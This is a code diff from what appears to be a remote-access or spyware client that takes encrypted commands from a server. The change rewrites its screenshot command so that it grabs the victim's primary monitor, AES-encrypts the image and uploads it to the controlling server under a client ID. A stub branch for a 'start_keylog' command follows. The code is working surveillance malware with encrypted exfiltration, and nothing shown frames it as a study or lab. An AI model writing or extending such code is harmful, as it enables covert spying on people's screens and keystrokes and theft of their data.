@@ -390,13 +390,45 @@ while True:
 
             command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
             command = f"{command_after_json_processing}"
-            
+        
             if command == "screenshot":
-                with mss.mss() as sct:
-                    screenshot = sct.grab(sct.monitors[1])  # Capture the primary monitor
-                    response = requests.post(f"{SERVER_URL}/api/screenshot", files={"file": ("screenshot.png", mss.tools.to_png(screenshot.rgb, screenshot.size))},data={"client_id": client_id}  # Include client_id in the request
-                , verify='cert.pem')
-                print(response.text)  # Print the API response
+                print("Starting screenshot process")
+                try:
+                    with mss.mss() as sct:
+                        # Capture the primary monitor
+                        screenshot = sct.grab(sct.monitors[1])  
+                        # Convert the screenshot to PNG bytes
+                        screenshot_raw = mss.tools.to_png(screenshot.rgb, screenshot.size)
+
+                        # Encrypt the raw screenshot data
+                        encrypted_data = encrypt_data(aes_key, screenshot_raw)
+
+                        # Convert encrypted dictionary to JSON and then to bytes
+                        encrypted_bytes = json.dumps(encrypted_data).encode('utf-8')
+
+                        # Prepare the encrypted data for sending
+                        screenshot_encrypted_file = {
+                            "file": ("screenshot.enc", encrypted_bytes, "application/octet-stream")
+                        }
+
+                        print("Encrypted data prepared, sending to server...")
+
+                        # Send the encrypted screenshot to the server
+                        response = requests.post(
+                            f"{SERVER_URL}/api/screenshot",
+                            files=screenshot_encrypted_file,
+                            data={"client_id": client_id},
+                            verify='cert.pem',
+                            timeout=10
+                        )
+
+                        print(f"Response Status Code: {response.status_code}")
+                        print(f"Response Content: {response.text}")
+
+                except Exception as e:
+                    print("Error during screenshot capture or upload:", e)
+
+
                 command = ""
             elif command.strip == "start_keylog":
                 pass
